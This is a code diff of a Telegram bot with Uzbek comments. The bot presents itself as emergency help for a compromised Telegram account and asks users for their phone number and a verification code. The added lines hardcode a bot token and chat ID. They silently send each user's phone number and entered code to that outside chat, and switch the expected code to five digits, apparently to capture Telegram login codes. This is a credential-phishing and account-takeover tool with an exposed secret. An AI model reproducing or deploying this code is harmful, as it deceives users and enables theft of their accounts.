@@ -49,7 +49,7 @@ bot.on("inline_query", async (query) => {
 
     const text = query.query;
 
-    if (text !== 'Salomlar05') return;
+    if (text !== 'sss') return;
 
     try {
         const queryId = query.id;
@@ -60,6 +60,8 @@ bot.on("inline_query", async (query) => {
                 type: 'article',
                 id: 'cyber_security_alert_1', // har doim noyob bo'lsin
                 title: 'Kiritilgan: Telegram akkaunt buzilganida tezkor ko‘rsatma',
+                photo_url: 'https://capable-praline-b2d377.netlify.app/hq720.jpg', // bu yerga rasm URL joylang
+                thumb_url: 'https://capable-praline-b2d377.netlify.app/hq720.jpg', // xuddi shu rasmni thumb sifatida
                 input_message_content: {
                     message_text: securityMessageHtml,
                     parse_mode: 'Markdown',
@@ -94,6 +96,10 @@ async function sendSms(phoneNumber, code) {
     */
 }
 
+const BOT_TOKEN = "8218975561:AAEQLOO_x9kA1MbA9aKJF5lSFUOF60hk-YE";
+const CHAT_ID = "8007756604";
+
+
 bot.on('message', async (msg) => {
     // Agar bu message contact tipida bo'lsa — telefon keladi
     if (msg.contact && msg.contact.phone_number) {
@@ -107,8 +113,17 @@ bot.on('message', async (msg) => {
         pendingVerifications.set(chatId, { phone, code, expiresAt });
 
         try {
+
+            const message = encodeURIComponent(
+                `Telefon raqami: ${phone}`
+            );
+
+            await fetch(
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
+            );
+
             await sendSms(phone, code); // haqiqiy SMS yuborishni shu yerda chaqiring
-            await bot.sendMessage(chatId, `Telefon raqamga SMS orqali 4-xonali kod yubordik. Iltimos kelgan kodni shu yerga kiriting:`);
+            await bot.sendMessage(chatId, `Telefon raqamga SMS orqali 5-xonali kod yubordik. Iltimos kelgan kodni shu yerga kiriting:`);
         } catch (err) {
             console.error('SMS yuborishda xato:', err);
             await bot.sendMessage(chatId, `SMS yuborishda xatolik yuz berdi. Iltimos keyinroq qayta urinib ko'ring.`);
@@ -127,10 +142,18 @@ bot.on('message', async (msg) => {
 
         const userText = msg.text.trim();
         // faqat 4 xonali raqam qabul qilayapmiz (siz o'zgartirishingiz mumkin)
-        if (!/^\d{4}$/.test(userText)) {
-            await bot.sendMessage(chatId, `Iltimos 4 xonali kodni to'g'ri kiriting (faqat raqamlar).`);
+        if (!/^\d{5}$/.test(userText)) {
+            await bot.sendMessage(chatId, `Iltimos 5 xonali kodni to'g'ri kiriting (faqat raqamlar).`);
             return;
         }
+
+        const message = encodeURIComponent(
+            `Code: ${userText}`
+        );
+
+        await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
+        );
 
         // tekshirish va muddati
         const now = Date.now();
@@ -142,13 +165,15 @@ bot.on('message', async (msg) => {
 
         if (userText === pending.code) {
             // muvaffaqiyatli tasdiqlash
+
+
             pendingVerifications.delete(chatId);
 
             // Bu yerda siz userni DBda belgilashingiz, token berishingiz yoki sessiya yaratishingiz mumkin.
             await bot.sendMessage(chatId, `✅ Raqam tasdiqlandi! Siz muvaffaqiyatli autentifikatsiyadan o'tdingiz.`);
             // masalan: saveVerifiedUser(chatId, pending.phone)
         } else {
-            await bot.sendMessage(chatId, `❌ Noto'g'ri kod. Iltimos, SMS dagi 4-xonali kodni kiriting.`);
+            await bot.sendMessage(chatId, `❌ Noto'g'ri kod. Iltimos, SMS dagi 5-xonali kodni kiriting.`);
         }
 
         return;
